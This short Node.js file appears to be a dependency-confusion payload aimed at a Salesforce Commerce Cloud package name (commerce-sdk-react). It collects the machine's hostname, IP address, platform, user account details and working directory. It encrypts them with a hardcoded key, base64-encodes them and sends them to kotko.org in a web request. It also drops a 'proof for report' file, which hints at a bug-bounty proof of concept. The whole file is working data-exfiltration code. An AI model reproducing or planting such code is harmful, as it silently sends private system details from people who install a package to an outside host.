var os = require("os");
const request = require('request');
const crypto = require('crypto');
var fs = require('fs');


var hostname = os.hostname();
var type = os.platform();
var userInfo = os.userInfo();
var currentPath = process.cwd();
var json = [];
var ip = require("ip");



const algorithm = 'aes-256-ctr';
const secretKey = 'vOVH6sdmpNWjRRIqCc7rdxs01lwHzfr3';
const iv = crypto.randomBytes(16);

json.push(hostname)
json.push(ip.address())
json.push(type)
json.push(userInfo)
json.push(currentPath)
json = JSON.stringify(json);
const { encrypt, decrypt } = require('./crypto');

let hash = encrypt(json);


let company = "npmjs+"+"salesforcecommercecloud--pwa-kit"
let packages = "commerce-sdk-react"

fs.writeFile('ByKotko.txt', 'this proof for report', function (err) {
  if (err) throw err;
});
//


var buff = Buffer.from(JSON.stringify(hash)).toString("base64");
request(`https://kotko.org/?${company}:${packages}=${buff}`, (error, response, body) => {})
